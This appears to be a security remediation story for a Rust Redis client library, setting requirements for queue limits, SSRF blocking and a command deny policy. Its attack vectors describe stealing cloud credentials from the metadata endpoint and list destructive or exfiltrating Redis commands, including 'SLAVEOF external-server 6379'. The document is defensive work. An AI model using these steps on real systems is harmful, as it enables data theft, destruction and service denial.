# Story 3 — SSRF and Command Injection

**Finding IDs:** #7, #8, #9 (HIGH)

**Objective:** Add resource limits, SSRF protection, and command injection safeguards.

---

## Issue #7: Unbounded Request Queue — Memory Exhaustion

**Severity:** HIGH

### Problem Description

The `req_queue` is an unbounded `mpsc::Queue`:
```rust
let req_queue = Arc::new(Queue::new());
```

There is no backpressure mechanism. A sender can push unlimited requests, which buffer in memory. The `WRITE_BUF_RESERVE_TARGET` of 64KB is only for the write buffer, not the queue. An attacker who can queue many requests can cause OOM.

### Attack Vector

An attacker who can control the `host` parameter or command parameters can force the creation of many `Request` objects. Each request allocates:
- `Vec<u8>` for RESP bytes (potentially large for big strings)
- `spsc::Sender<RedisValue>` channel handle
- Queue entry in `mpsc::Queue`

After N requests where N * avg_request_size > available RAM, the process OOMs.

### Acceptance Criteria

1. **AC-3.1:** The request queue must have a configurable maximum depth (default: 1024).
2. **AC-3.2:** When the queue is full, `Connection::send()` must return `Err` instead of blocking or panicking.
3. **AC-3.3:** The caller must be able to distinguish "queue full" from other errors.
4. **AC-3.4:** Each request's RESP data must have a maximum size (default: 64KB per command).

### Functional Requirements

- **FR-021:** Add `max_queue_depth: usize` and `max_request_size: usize` to `Connection`.
- **FR-022:** `Connection::send()` must check both limits before accepting a request.
- **FR-023:** Add `Connection::connect_with_limits()` constructor accepting limit parameters.
- **FR-024:** The existing `Connection::connect()` must use sensible defaults for the limits.

### Non-Functional Requirements

- **NFR-011:** Queue full errors must not cause the connection loop to enter an error state — it should continue processing other requests.
- **NFR-012:** Limit checking must be O(1) — no iteration over the queue to count elements.

---

## Issue #8: DNS-Based SSRF — No Internal IP Restriction

**Severity:** HIGH

### Problem Description

The `connect()` method resolves and connects to **any hostname**. An attacker who can control the `host` parameter can connect to:
- Internal services (metadata endpoints: `169.254.169.254`)
- Kubernetes service discovery
- Internal Redis instances on other networks
- Debug ports on internal hosts

No allowlist or denylist exists.

### Attack Vector

If this library is used in a web application where the user can influence the Redis connection string (e.g., a multi-tenant app where each tenant configures their own Redis), an attacker tenant could:
1. Set their Redis host to `169.254.169.254/latest/meta-data/iam/security-credentials/`
2. The library connects and sends AUTH/commands
3. The attacker reads AWS IAM credentials from the metadata endpoint
4. Full cloud account compromise

This is a classic SSRF (Server-Side Request Forgery) vulnerability.

### Acceptance Criteria

1. **AC-3.5:** Connecting to RFC 1918 addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) must be rejectable.
2. **AC-3.6:** Connecting to link-local addresses (169.254.0.0/16) must be rejectable.
3. **AC-3.7:** Connecting to loopback (127.0.0.0/8) must be rejectable (configurable).
4. **AC-3.8:** Connecting to IPv6 loopback (::1) must be rejectable (configurable).
5. **AC-3.9:** The SSRF protection must be opt-in (disabled by default for backward compatibility) but enabled by default in new constructors.
6. **AC-3.10:** DNS resolution must be checked AFTER resolution — not before — because DNS rebinding attacks resolve to different IPs.

### Functional Requirements

- **FR-025:** Implement `ssrf_allowed(addr: &SocketAddr) -> bool` function that checks against deny-listed ranges.
- **FR-026:** After DNS resolution, each `SocketAddr` must be checked against the deny list before connecting.
- **FR-027:** Add `Connection::connect_with_ssrf_protection()` constructor that enables SSRF checks.
- **FR-028:** The deny list must be configurable via `SsrfConfig { deny_private: bool, deny_loopback: bool, deny_link_local: bool }`.

### Non-Functional Requirements

- **NFR-013:** SSRF checking must be O(1) per address — just bitwise range checks, no iteration.
- **NFR-014:** DNS rebinding protection must check the resolved IP against the deny list, not just the hostname.

---

## Issue #9: No Command Whitelist/Sanitization

**Severity:** HIGH

### Problem Description

All Redis commands pass through unfiltered. An attacker with write access to application variables can execute:
- `FLUSHALL`, `FLUSHDB` — destroy all data
- `CONFIG SET` — reconfigure Redis
- `DEBUG SLEEP` — cause denial of service
- `SLAVEOF` / `REPLICAOF` — hijack replication

### Attack Vector

If this library is used in a context where command names come from user input (e.g., a command router, a debugging endpoint, or any application that maps user actions to Redis commands), an attacker can:
1. Send `FLUSHALL` to delete all data
2. Send `CONFIG SET maxmemory 0` to disable memory limits
3. Send `SLAVEOF external-server 6379` to exfiltrate data via replication
4. Send `DEBUG SLEEP 3600` to cause a 1-hour denial of service

### Acceptance Criteria

1. **AC-3.11:** A `CommandPolicy` enum must allow configuring allowed/disallowed commands.
2. **AC-3.12:** The default policy must allow all commands (backward compatible) but be documented as a security concern.
3. **AC-3.13:** A `DenyPolicy` variant must exist that denies dangerous commands: FLUSHALL, FLUSHDB, CONFIG, DEBUG, SLAVEOF, REPLICAOF, SHUTDOWN, KEYS, BGSAVE, BGREWRITEAOF.
4. **AC-3.14:** A `WhitelistPolicy` variant must exist that allows only a specified set of commands.
5. **AC-3.15:** Command policy checks must happen before the command is sent to the connection loop.

### Functional Requirements

- **FR-029:** Implement `CommandPolicy` enum: `AllowAll`, `DenyCommands(Vec<String>)`, `AllowCommands(Vec<String>)`.
- **FR-030:** Add `CommandBuilder::validate_policy(&self, policy: &CommandPolicy) -> Result<(), RedisError>`.
- **FR-031:** `RedisClient::execute()` must check the policy before sending.
- **FR-032:** The `CommandBuilder` must include a `command_name()` accessor for policy checks.

### Non-Functional Requirements

- **NFR-015:** Policy checking must be O(1) — use a `HashSet` or binary search tree, not linear scan.
- **NFR-016:** Policy enforcement must not add more than 2 microseconds of latency per command.

---

## Verification

```bash
cargo test --lib --all-features
cargo clippy --workspace --all-targets --all-features
cargo fmt --all --check
```

## Source References

- `src/connection/connection.rs` lines 118-139: Connection struct with unbounded queue
- `src/connection/tcp.rs` lines 67-105: DNS resolution and connection
- `src/protocol/builder.rs` lines 17-41: CommandBuilder — no sanitization
